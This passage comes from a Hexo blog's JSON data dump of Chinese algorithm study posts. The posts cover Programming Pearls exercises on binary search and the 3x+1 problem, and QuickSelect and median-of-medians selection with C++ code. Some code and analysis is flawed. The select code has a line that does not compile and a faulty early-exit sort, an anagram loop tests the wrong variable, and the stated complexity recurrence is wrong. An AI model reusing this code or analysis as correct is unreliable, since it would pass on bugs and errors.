class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt; anagram(<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt;&amp; Strs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">unordered_map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt;&gt; <span class=\"built_in\">map</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt; ans;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num = Strs.size();</span><br><span class=\"line\">\t<span class=\"built_in\">string</span> tmp;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;num;++i)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttmp = Strs[i];</span><br><span class=\"line\">\t\tsort(tmp.begin(), tmp.end());</span><br><span class=\"line\">\t\t<span class=\"built_in\">map</span>[tmp].push_back(i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> &amp;m : <span class=\"built_in\">map</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> n = m.second.size();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(num &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;n;++i)</span><br><span class=\"line\">\t\t\t\tans.push_back(Strs[m.second[i]]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"数据决定程序结构 && 编写正确的程序","_content":"\n> “文字较多”\n\n\n## 前言\n\n三四章的说明性内容较多，就放在一起来写吧。\n\n\n---\n\n## 正文\n\n第三章说明了数据对程序的决定性，正如书中的原话所说 **(数据的)表示形式是程序设计的根本**。\n\n这让我不由的想起之前做某道OJ题，看到某大牛提供的答案因为巧妙利用了输入数据的性质而在线性的时间AC，当时居然有点觉得这是奇技淫巧，不可取。NAIVE！\n\n当程序有很多重复部分时，我们可以使用**格式编程**，可以使得代码简洁易于维护。当然，书中也鼓励我们使用已有的轮子，节约时间与代码量。\n\n第四章着重于对程序的理解以及对**程序正确性**的证明。\n\n书中花了大量篇幅论述了二分搜索的**停机证明**。个人感觉，要证明自己程序的正确性其实并不容易，比如第四章exe5。\n\n下面是两道练习题\n\n### Chapter 4 exe2 \n\n> 如果原始的二分搜索对你来说太过容易，那么请试试这个演化后的版本：把 t 在数组中第一次出现的位置返回给 p。要求代码对数组元素进行对数次比较（该任务可以在 log2(n) 次比较之内完成）。\n\n``` c++\n// a是排序好的数组，l,r 为左右界，t为查找的数\nint BinarySearch(int *a, int l, int r, int t)\n{\n\twhile(l <= r)\n\t{\n\t\tif(a[l] == t) return l;\n\t\tint mid = (l+r) / 2;\n\t\tif(a[mid] < t) l = mid + 1;\n\t\tif(a[mid] == t) r = mid;\n\t\tif(a[mid] > t) r = mid - 1;\n\t}\n\treturn -1;  //not find return -1\n}\n```\n思路很好理解，因为我们要找最先出现的位置，那么我们总是要寻找尽量靠左的部分，于是我们每次都尽可能往左递归。\n\n### Chapter 4 exe5\n\n> 证明下面的程序在输入 x 为正整数时能够终止。\n\n``` c++\nwhile x != 1 do\n\tif even(x)\n\t\tx = x/2\n\telse\n\t\tx = 3*x + 1\n```\n\n这题开始感觉挺简单的，后来愈发感觉不对劲，上网查了查发现这是一个著名的数学猜想，名字比较多，就取其中一个通用的，叫它3x+1问题好了。（感觉作者把这个题放在这里略不厚道）\n\n网上的证明众说纷纭啊，暂时先放下0.0\n","source":"_posts/2016-10-21-BCZJ34.markdown","raw":"---\nlayout:     post\ntitle:      \"数据决定程序结构 && 编写正确的程序\"\ntags:\n    - 编程珠玑\n---\n\n> “文字较多”\n\n\n## 前言\n\n三四章的说明性内容较多，就放在一起来写吧。\n\n\n---\n\n## 正文\n\n第三章说明了数据对程序的决定性，正如书中的原话所说 **(数据的)表示形式是程序设计的根本**。\n\n这让我不由的想起之前做某道OJ题，看到某大牛提供的答案因为巧妙利用了输入数据的性质而在线性的时间AC，当时居然有点觉得这是奇技淫巧，不可取。NAIVE！\n\n当程序有很多重复部分时，我们可以使用**格式编程**，可以使得代码简洁易于维护。当然，书中也鼓励我们使用已有的轮子，节约时间与代码量。\n\n第四章着重于对程序的理解以及对**程序正确性**的证明。\n\n书中花了大量篇幅论述了二分搜索的**停机证明**。个人感觉，要证明自己程序的正确性其实并不容易，比如第四章exe5。\n\n下面是两道练习题\n\n### Chapter 4 exe2 \n\n> 如果原始的二分搜索对你来说太过容易，那么请试试这个演化后的版本：把 t 在数组中第一次出现的位置返回给 p。要求代码对数组元素进行对数次比较（该任务可以在 log2(n) 次比较之内完成）。\n\n``` c++\n// a是排序好的数组，l,r 为左右界，t为查找的数\nint BinarySearch(int *a, int l, int r, int t)\n{\n\twhile(l <= r)\n\t{\n\t\tif(a[l] == t) return l;\n\t\tint mid = (l+r) / 2;\n\t\tif(a[mid] < t) l = mid + 1;\n\t\tif(a[mid] == t) r = mid;\n\t\tif(a[mid] > t) r = mid - 1;\n\t}\n\treturn -1;  //not find return -1\n}\n```\n思路很好理解，因为我们要找最先出现的位置，那么我们总是要寻找尽量靠左的部分，于是我们每次都尽可能往左递归。\n\n### Chapter 4 exe5\n\n> 证明下面的程序在输入 x 为正整数时能够终止。\n\n``` c++\nwhile x != 1 do\n\tif even(x)\n\t\tx = x/2\n\telse\n\t\tx = 3*x + 1\n```\n\n这题开始感觉挺简单的，后来愈发感觉不对劲，上网查了查发现这是一个著名的数学猜想，名字比较多，就取其中一个通用的，叫它3x+1问题好了。（感觉作者把这个题放在这里略不厚道）\n\n网上的证明众说纷纭啊，暂时先放下0.0\n","slug":"BCZJ34","published":1,"date":"2016-10-20T16:00:00.000Z","updated":"2018-04-23T11:23:38.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizaz0007rike3tkui7ze","content":"<blockquote>\n<p>“文字较多”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>三四章的说明性内容较多，就放在一起来写吧。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>第三章说明了数据对程序的决定性，正如书中的原话所说 <strong>(数据的)表示形式是程序设计的根本</strong>。</p>\n<p>这让我不由的想起之前做某道OJ题，看到某大牛提供的答案因为巧妙利用了输入数据的性质而在线性的时间AC，当时居然有点觉得这是奇技淫巧，不可取。NAIVE！</p>\n<p>当程序有很多重复部分时，我们可以使用<strong>格式编程</strong>，可以使得代码简洁易于维护。当然，书中也鼓励我们使用已有的轮子，节约时间与代码量。</p>\n<p>第四章着重于对程序的理解以及对<strong>程序正确性</strong>的证明。</p>\n<p>书中花了大量篇幅论述了二分搜索的<strong>停机证明</strong>。个人感觉，要证明自己程序的正确性其实并不容易，比如第四章exe5。</p>\n<p>下面是两道练习题</p>\n<h3 id=\"Chapter-4-exe2\"><a href=\"#Chapter-4-exe2\" class=\"headerlink\" title=\"Chapter 4 exe2\"></a>Chapter 4 exe2</h3><blockquote>\n<p>如果原始的二分搜索对你来说太过容易，那么请试试这个演化后的版本：把 t 在数组中第一次出现的位置返回给 p。要求代码对数组元素进行对数次比较（该任务可以在 log2(n) 次比较之内完成）。</p>\n</blockquote>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a是排序好的数组，l,r 为左右界，t为查找的数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span> *a, <span class=\"keyword\">int</span> l, <span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> t)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(l &lt;= r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[l] == t) <span class=\"keyword\">return</span> l;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = (l+r) / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &lt; t) l = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] == t) r = mid;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt; t) r = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;  <span class=\"comment\">//not find return -1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路很好理解，因为我们要找最先出现的位置，那么我们总是要寻找尽量靠左的部分，于是我们每次都尽可能往左递归。</p>\n<h3 id=\"Chapter-4-exe5\"><a href=\"#Chapter-4-exe5\" class=\"headerlink\" title=\"Chapter 4 exe5\"></a>Chapter 4 exe5</h3><blockquote>\n<p>证明下面的程序在输入 x 为正整数时能够终止。</p>\n</blockquote>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> x != <span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> even(x)</span><br><span class=\"line\">\t\tx = x/<span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tx = <span class=\"number\">3</span>*x + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>这题开始感觉挺简单的，后来愈发感觉不对劲，上网查了查发现这是一个著名的数学猜想，名字比较多，就取其中一个通用的，叫它3x+1问题好了。（感觉作者把这个题放在这里略不厚道）</p>\n<p>网上的证明众说纷纭啊，暂时先放下0.0</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“文字较多”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>三四章的说明性内容较多，就放在一起来写吧。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>第三章说明了数据对程序的决定性，正如书中的原话所说 <strong>(数据的)表示形式是程序设计的根本</strong>。</p>\n<p>这让我不由的想起之前做某道OJ题，看到某大牛提供的答案因为巧妙利用了输入数据的性质而在线性的时间AC，当时居然有点觉得这是奇技淫巧，不可取。NAIVE！</p>\n<p>当程序有很多重复部分时，我们可以使用<strong>格式编程</strong>，可以使得代码简洁易于维护。当然，书中也鼓励我们使用已有的轮子，节约时间与代码量。</p>\n<p>第四章着重于对程序的理解以及对<strong>程序正确性</strong>的证明。</p>\n<p>书中花了大量篇幅论述了二分搜索的<strong>停机证明</strong>。个人感觉，要证明自己程序的正确性其实并不容易，比如第四章exe5。</p>\n<p>下面是两道练习题</p>\n<h3 id=\"Chapter-4-exe2\"><a href=\"#Chapter-4-exe2\" class=\"headerlink\" title=\"Chapter 4 exe2\"></a>Chapter 4 exe2</h3><blockquote>\n<p>如果原始的二分搜索对你来说太过容易，那么请试试这个演化后的版本：把 t 在数组中第一次出现的位置返回给 p。要求代码对数组元素进行对数次比较（该任务可以在 log2(n) 次比较之内完成）。</p>\n</blockquote>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a是排序好的数组，l,r 为左右界，t为查找的数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span> *a, <span class=\"keyword\">int</span> l, <span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> t)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(l &lt;= r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[l] == t) <span class=\"keyword\">return</span> l;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = (l+r) / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &lt; t) l = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] == t) r = mid;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt; t) r = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;  <span class=\"comment\">//not find return -1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路很好理解，因为我们要找最先出现的位置，那么我们总是要寻找尽量靠左的部分，于是我们每次都尽可能往左递归。</p>\n<h3 id=\"Chapter-4-exe5\"><a href=\"#Chapter-4-exe5\" class=\"headerlink\" title=\"Chapter 4 exe5\"></a>Chapter 4 exe5</h3><blockquote>\n<p>证明下面的程序在输入 x 为正整数时能够终止。</p>\n</blockquote>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> x != <span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> even(x)</span><br><span class=\"line\">\t\tx = x/<span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tx = <span class=\"number\">3</span>*x + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>这题开始感觉挺简单的，后来愈发感觉不对劲，上网查了查发现这是一个著名的数学猜想，名字比较多，就取其中一个通用的，叫它3x+1问题好了。（感觉作者把这个题放在这里略不厚道）</p>\n<p>网上的证明众说纷纭啊，暂时先放下0.0</p>\n"},{"layout":"post","title":"基于 Deterministic Select 的快速选择","mathjax":true,"_content":"\n> “可参考《算法导论 第三版》第123页”\n\n\n## 前言\n\n算法老师 Dominik 在 week5 最后一节课快结束时讲到，当时比较匆忙，在此做以整理，尽量使说明通俗易懂。\n\n这个算法用于求一个无序数组中的第k大数，并且可以保证**最坏情况下**时间复杂度为 O(n)。在本文最后会对这一时间复杂度进行说明。\n\n---\n\n## 正文\n\n寻找第k大的数，这是个看起来十分简单的问题，最简单的想法，把数组排个序，然后输出第k个。那么对于排序算法，有归并排序**MergeSort**和快速排序**QuickSort**，时间复杂度都是O（nlogn），当然你也可以使用堆排序，然后pop k次。\n\n本文将介绍一种**基于中位数**的快速选择算法 **Deterministic Select**，它可以达到最坏情况下O（n）的时间复杂度。在介绍这一算法前需要首先熟悉一下通常而言的 **QuickSelect** 方法。\n\n\n### Quick Select \n\n当然，其实我很想说，在介绍快速选择算法**quickselect**之前，需要先熟悉一下快速排序算法**quicksort**，可是这样就显得啰哩啰嗦了。所以如果你不知道快排的话，还是先乖乖的拿起数据结构或者算法书学习一个。\n\n快速选择的思想来源于快速排序，转化也十分简单。\n\n在快速排序中，我们首先随机选择数组中的一个数作为**pivot**（一般选择第一个数），然后遍历一遍数组，***将比pivot小的数放在它的左边，将比pivot大的数放在它的右边***，再递归排序pivot左右两侧的数即可。\n\n在快速选择时，因为我们要寻找第k大的数，所以我们可以记录一下在上面斜体字执行完后，pivot 是这个数组中的第几个（假设为第 m 个），如果k == m，那么 pivot就是第k大的数，如果k < m，那么第 k 大的数在 pivot 左边的数组中，依然是第k大，否则在 pivot 右边的数组中，是第 k - m 大。\n\n``` c++\n// 伪代码\nint QuickSelect(array A, int k)\n{\n\tif |A| == 0 : error\n\tif |A| == 1 : if K == 1 :return A[1]\n\t\t\telse : error\n\tselect pivot from A randomly\n\n\tarray Left : those < pivot\n\tarray Right : those >= pivot\n\tm = |Left| + 1\n\n\tif k == m : return pivot\n\tif k < m : return QuickSelect(Left, k)\n\telse : return QuickSelect(Right, k-m)\n}\n```\n由于quicksort对于 pivot 选择的随机性，我们可以计算它的average running time 的 worst case。\n\n![img](/images/in-post/post-blog-devidearray.png)\n\n现在我们做如下定义，假设上图代表一个数组，我们称在完成一次数组划分后，pivot 位于数组靠近中间的位置为 good 位置，位于靠两边的位置为 bad 位置。那么 good 与 bad 的长度各占1/2.\n\n现在计算worst case，在最坏情况下，在一次数组划分后，pivot位于数组的起始或结束位置，设数组长度为n，在数组中寻找第k大的数所需时间为 T(n)。则T（n）的迭代式如下\n\n$$T(n)=n+\\frac{1}{2}T(n)+\\frac{1}{2}T(\\frac{3}{4}n)$$\n\n如何理解这个式子呢，首先，对数组以pivot为标准划分一次需要O（n）的时间，此时 pivot 要么在 good 位置，要么在 bad 位置，随机情况下，两者的概率是1/2，因为现在考虑最坏情况，那么pivot的位置会在上图**灰色箭头**处,于是若pivot在bad位置，则所需时间为T(n),若在good位置，所需时间为T(3n/4)。\n\n对迭代式稍作变换有\n\n$$T(n)=2*n+T(\\frac{3}{4}n)$$\n\n根据等比数列求和可得\n\n$$T(n)=8n$$\n\n于是，在平均情况下，quicksort的最坏时间复杂度是线性的。但是，考虑非平均情况，比如这个数组的结构不是很好或者我们的运气很背，导致每次划分完数组，pivot的位置都在数组的两端，那么这个方法就会退化为O（n^2）。下面要介绍的Deterministic Select算法则可以保证在最坏情况下，时间复杂度也是O（n）。\n\n### Deterministic Select\n\n考虑我们的输入数组为\n\n\t100 93 78 76 34\n\t25 22 9 6 1024\n\t135 68 24 153 1\n\t56 89 111 14 46\n\t1034 45 12\n\n我们将这个数组以五个数为一组进行划分并排序，得到\n\n![img](/images/in-post/post-blog-5itemarray1.png)\n\n然后，我们以每组中位数的大小进行排序，得到\n\n![img](/images/in-post/post-blog-5itemarray2.png)\n\n从图中可以看出，这些中位数的中位数是56，而且经过这些操作，上图黄色底色位置的数可以被确定大于56，计算一下黄色底色的个数，不算**中位数的中位数** 56 所在的列和不足5个的列（在本例中，不足5个数的列恰在左边，当然它很可能出现在右边），则其个数至少为\n\n$$3*(\\frac{1}{2}[\\frac{n}{5}]-2)>=\\frac{3n}{10}-6$$\n\n同理，可以确定小于 56 的数（在左上角）的个数也至少为这么多。看到这里大家可能会明白了吧，如果我们选择 56 作为 pivot ，那么每次划分数组，都可以保证 pivot 的左右两边分别至少被划分了这么多数，为方便计算，去掉常数项，就有3n/10的数至少分布在 pivot 两侧，这个比例很接近1/3，也就是说经过这样划分，pivot 处于good位置，考虑此时的worst case\n\n$$T(n)=n+T(\\frac{3}{10}n)$$\n\n很明显这是线性时间复杂度。\n\n这一算法的思想依然来源于quicksort，但是通过巧妙选取pivot，使得每次划分数组，都可以至少排除约1/3的数，从而保证了时间的线性性质。\n\n下面是算法的代码实现，在实际过程中，我们没必要对5个数的小数组再进行按照中位数排序，只要递归找到中位数的中位数即可（上面对5个小数组排序只是为了说明所占比例问题）\n\n``` c++\n//\n//  main.cpp\n//  deterministic_select\n//\n//  Created on 16/10/27.\n\n#include <iostream>\nusing namespace std;\n\n/*-----------------------------------------------\n * Function   -   sort these 5 numbers and return\n *                the median\n * ==============================================\n * arr        -   the array need to be sorted\n * arr_size   -   the size\n * ==============================================\n * Return     -   the median\n */\nint BubbleSort(int *arr, int arr_size)\n{\n    int *a =new int[arr_size];\n    for(int i = 0;i< arr_size;++i) a[i] = arr[i];\n    bool flag;\n    for(int i = 0;i<arr_size;++i)\n    {\n        flag = false;\n        for(int j = i;j<arr_size;++j)\n        {\n            if(a[i] > a[j])\n            {\n                int tmp = a[i];\n                a[i] = a[j];\n                a[j] = tmp;\n                flag = true;\n            }\n        }\n        if(! flag) break;\n    }\n    return a[arr_size/2];\n}\n\n/*----------------------------------------------\n * Function   -   return the num-th number in\n *                this array running time O(n)\n * =============================================\n * arr        -   the input array\n * arr_size   -   the size of the input array\n * num        -   want to find the num-th number\n *                in this array\n * =============================================\n * Return     -   the num-th number\n */\nint DS(int * arr, int arr_size, int num)\n{\n    if(arr_size == 1)\n    {\n        return arr[0];\n    }\n    \n    int arr_num = arr_size / 5;\n    int *split_median = new int[arr_num + 1];\n    for(int i = 0;i<arr_num;++i)\n    {\n        split_median[i] = BubbleSort(arr + i * 5, 5);\n    }\n    if(arr_size % 5 != 0)\n    {\n        split_median[arr_num] = BubbleSort(arr + arr_num*5, arr_size - arr_num*5);\n        arr_num ++;\n    }\n    \n    int pivot,pivot_index;\n    pivot = DS(split_median, arr_num, arr_num/2);\n    delete [] split_median;\n    \n    for(int i = 0;i<arr_size;++i)\n    {\n        if(pivot == arr[i]) pivot_index = i,break;\n    }\n    \n    int left = 0, right = arr_size-1;\n    arr[pivot_index] = arr[0];\n    while(left < right)\n    {\n        while(left < right && arr[right] >= pivot)\n            right --;\n        if(left < right)\n            arr[left ++] = arr[right];\n        while(left < right && arr[left] < pivot)\n            left ++;\n        if(left < right)\n            arr[right --] = arr[left];\n    }\n    arr[left] = pivot;\n    \n    if(left == (num-1)) return pivot;\n    if((num-1) < left) return DS(arr, left, num);\n    else return DS(arr + left + 1, arr_size - left - 1, num - left - 1);\n}\n\nint main()\n{\n    int Size = 23;\n    int *Array = new int[Size];\n    cout << \"Please choose the n-th number, the max number is \"<< Size<<\" : \"<<endl;\n    int No;\n    cin >> No;\n    freopen(\"input.txt\", \"r\", stdin);\n    for(int i = 0;i<Size;++i) cin >> Array[i];\n    int ans = DS(Array, Size, No);\n    cout << ans << endl;\n    return 0;\n}\n```\n\n","source":"_posts/2016-10-28-DS.markdown","raw":"---\nlayout:     post\ntitle:      \"基于 Deterministic Select 的快速选择\"\ntags:\n    - Algorithm\nmathjax: true\n---\n\n> “可参考《算法导论 第三版》第123页”\n\n\n## 前言\n\n算法老师 Dominik 在 week5 最后一节课快结束时讲到，当时比较匆忙，在此做以整理，尽量使说明通俗易懂。\n\n这个算法用于求一个无序数组中的第k大数，并且可以保证**最坏情况下**时间复杂度为 O(n)。在本文最后会对这一时间复杂度进行说明。\n\n---\n\n## 正文\n\n寻找第k大的数，这是个看起来十分简单的问题，最简单的想法，把数组排个序，然后输出第k个。那么对于排序算法，有归并排序**MergeSort**和快速排序**QuickSort**，时间复杂度都是O（nlogn），当然你也可以使用堆排序，然后pop k次。\n\n本文将介绍一种**基于中位数**的快速选择算法 **Deterministic Select**，它可以达到最坏情况下O（n）的时间复杂度。在介绍这一算法前需要首先熟悉一下通常而言的 **QuickSelect** 方法。\n\n\n### Quick Select \n\n当然，其实我很想说，在介绍快速选择算法**quickselect**之前，需要先熟悉一下快速排序算法**quicksort**，可是这样就显得啰哩啰嗦了。所以如果你不知道快排的话，还是先乖乖的拿起数据结构或者算法书学习一个。\n\n快速选择的思想来源于快速排序，转化也十分简单。\n\n在快速排序中，我们首先随机选择数组中的一个数作为**pivot**（一般选择第一个数），然后遍历一遍数组，***将比pivot小的数放在它的左边，将比pivot大的数放在它的右边***，再递归排序pivot左右两侧的数即可。\n\n在快速选择时，因为我们要寻找第k大的数，所以我们可以记录一下在上面斜体字执行完后，pivot 是这个数组中的第几个（假设为第 m 个），如果k == m，那么 pivot就是第k大的数，如果k < m，那么第 k 大的数在 pivot 左边的数组中，依然是第k大，否则在 pivot 右边的数组中，是第 k - m 大。\n\n``` c++\n// 伪代码\nint QuickSelect(array A, int k)\n{\n\tif |A| == 0 : error\n\tif |A| == 1 : if K == 1 :return A[1]\n\t\t\telse : error\n\tselect pivot from A randomly\n\n\tarray Left : those < pivot\n\tarray Right : those >= pivot\n\tm = |Left| + 1\n\n\tif k == m : return pivot\n\tif k < m : return QuickSelect(Left, k)\n\telse : return QuickSelect(Right, k-m)\n}\n```\n由于quicksort对于 pivot 选择的随机性，我们可以计算它的average running time 的 worst case。\n\n![img](/images/in-post/post-blog-devidearray.png)\n\n现在我们做如下定义，假设上图代表一个数组，我们称在完成一次数组划分后，pivot 位于数组靠近中间的位置为 good 位置，位于靠两边的位置为 bad 位置。那么 good 与 bad 的长度各占1/2.\n\n现在计算worst case，在最坏情况下，在一次数组划分后，pivot位于数组的起始或结束位置，设数组长度为n，在数组中寻找第k大的数所需时间为 T(n)。则T（n）的迭代式如下\n\n$$T(n)=n+\\frac{1}{2}T(n)+\\frac{1}{2}T(\\frac{3}{4}n)$$\n\n如何理解这个式子呢，首先，对数组以pivot为标准划分一次需要O（n）的时间，此时 pivot 要么在 good 位置，要么在 bad 位置，随机情况下，两者的概率是1/2，因为现在考虑最坏情况，那么pivot的位置会在上图**灰色箭头**处,于是若pivot在bad位置，则所需时间为T(n),若在good位置，所需时间为T(3n/4)。\n\n对迭代式稍作变换有\n\n$$T(n)=2*n+T(\\frac{3}{4}n)$$\n\n根据等比数列求和可得\n\n$$T(n)=8n$$\n\n于是，在平均情况下，quicksort的最坏时间复杂度是线性的。但是，考虑非平均情况，比如这个数组的结构不是很好或者我们的运气很背，导致每次划分完数组，pivot的位置都在数组的两端，那么这个方法就会退化为O（n^2）。下面要介绍的Deterministic Select算法则可以保证在最坏情况下，时间复杂度也是O（n）。\n\n### Deterministic Select\n\n考虑我们的输入数组为\n\n\t100 93 78 76 34\n\t25 22 9 6 1024\n\t135 68 24 153 1\n\t56 89 111 14 46\n\t1034 45 12\n\n我们将这个数组以五个数为一组进行划分并排序，得到\n\n![img](/images/in-post/post-blog-5itemarray1.png)\n\n然后，我们以每组中位数的大小进行排序，得到\n\n![img](/images/in-post/post-blog-5itemarray2.png)\n\n从图中可以看出，这些中位数的中位数是56，而且经过这些操作，上图黄色底色位置的数可以被确定大于56，计算一下黄色底色的个数，不算**中位数的中位数** 56 所在的列和不足5个的列（在本例中，不足5个数的列恰在左边，当然它很可能出现在右边），则其个数至少为\n\n$$3*(\\frac{1}{2}[\\frac{n}{5}]-2)>=\\frac{3n}{10}-6$$\n\n同理，可以确定小于 56 的数（在左上角）的个数也至少为这么多。看到这里大家可能会明白了吧，如果我们选择 56 作为 pivot ，那么每次划分数组，都可以保证 pivot 的左右两边分别至少被划分了这么多数，为方便计算，去掉常数项，就有3n/10的数至少分布在 pivot 两侧，这个比例很接近1/3，也就是说经过这样划分，pivot 处于good位置，考虑此时的worst case\n\n$$T(n)=n+T(\\frac{3}{10}n)$$\n\n很明显这是线性时间复杂度。\n\n这一算法的思想依然来源于quicksort，但是通过巧妙选取pivot，使得每次划分数组，都可以至少排除约1/3的数，从而保证了时间的线性性质。\n\n下面是算法的代码实现，在实际过程中，我们没必要对5个数的小数组再进行按照中位数排序，只要递归找到中位数的中位数即可（上面对5个小数组排序只是为了说明所占比例问题）\n\n``` c++\n//\n//  main.cpp\n//  deterministic_select\n//\n//  Created on 16/10/27.\n\n#include <iostream>\nusing namespace std;\n\n/*-----------------------------------------------\n * Function   -   sort these 5 numbers and return\n *                the median\n * ==============================================\n * arr        -   the array need to be sorted\n * arr_size   -   the size\n * ==============================================\n * Return     -   the median\n */\nint BubbleSort(int *arr, int arr_size)\n{\n    int *a =new int[arr_size];\n    for(int i = 0;i< arr_size;++i) a[i] = arr[i];\n    bool flag;\n    for(int i = 0;i<arr_size;++i)\n    {\n        flag = false;\n        for(int j = i;j<arr_size;++j)\n        {\n            if(a[i] > a[j])\n            {\n                int tmp = a[i];\n                a[i] = a[j];\n                a[j] = tmp;\n                flag = true;\n            }\n        }\n        if(! flag) break;\n    }\n    return a[arr_size/2];\n}\n\n/*----------------------------------------------\n * Function   -   return the num-th number in\n *                this array running time O(n)\n * =============================================\n * arr        -   the input array\n * arr_size   -   the size of the 